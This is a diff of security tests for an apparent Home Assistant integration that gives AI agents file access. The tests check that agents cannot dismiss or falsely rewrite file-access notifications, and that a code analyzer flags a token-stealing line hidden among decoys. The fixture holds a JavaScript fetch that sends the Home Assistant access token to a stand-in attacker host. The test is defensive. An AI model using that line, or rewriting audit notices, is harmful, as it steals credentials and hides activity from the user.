@@ -521,9 +521,13 @@ async def test_a_long_lived_token_cannot_dismiss_the_record(
     [
         ("persistent_notification.dismiss", {"notification_id": "selora_file_access_ended_g1"}),
         ("persistent_notification.dismiss", {"notification_id": "selora_file_access_r1"}),
+        (
+            "persistent_notification.create",
+            {"notification_id": "selora_file_access_ended_g1", "message": "Files written: 0"},
+        ),
     ],
 )
-async def test_an_agent_cannot_dismiss_the_access_notifications(
+async def test_an_agent_cannot_dismiss_or_rewrite_the_access_notifications(
     hass: HomeAssistant, service: str, data: dict
 ) -> None:
     await async_setup_component(hass, "persistent_notification", {})
@@ -938,3 +942,43 @@ async def test_an_unknown_app_keeps_its_own_name_and_none_falls_back(
     anonymous = await _ask_as(hass, "python-httpx/0.27", "www/b")
     assert anonymous["agent_client"] is None
     assert anonymous["agent"] == "An AI assistant connected with your Selora account"
+
+
+def test_each_ha_token_is_its_own_credential() -> None:
+    from custom_components.selora_ai.mcp_server.dispatch import _credential_key
+    from custom_components.selora_ai.selora_auth import SeloraAuthContext
+
+    def key(refresh_token_id: str | None) -> str:
+        return _credential_key(
+            SeloraAuthContext(
+                user_id="u1",
+                email=None,
+                is_admin=True,
+                auth_type="ha_token",
+                refresh_token_id=refresh_token_id,
+            )
+        )
+
+    assert key("rt-a") != key("rt-b")
+    assert key("rt-a") == key("rt-a")
+
+
+def test_decoys_cannot_push_a_token_read_out_of_the_findings() -> None:
+    decoys = "\n".join(f'const u{i} = "https://cdn{i}.example.com/x";' for i in range(40))
+    text = decoys + '\nfetch("https://evil.attacker.io/?t=" + hass.auth.data.access_token);\n'
+
+    findings = analyze(text)
+
+    assert len(findings) <= 25
+    kinds = {f["kind"] for f in findings}
+    assert {"network", "credentials", "external_url"} <= kinds
+    overflow = findings[-1]
+    assert overflow["detail"].endswith("more findings not shown")
+    assert overflow["severity"] == "high"
+
+
+async def test_compressed_copies_are_never_written_to_www(hass: HomeAssistant) -> None:
+    for name in ("www/card/card.js.br", "www/card/card.js.gz"):
+        result = await config_files.async_write(hass, name, "console.log(1)")
+        assert result["written"] is False
+        assert "Compressed copies" in result["error"]
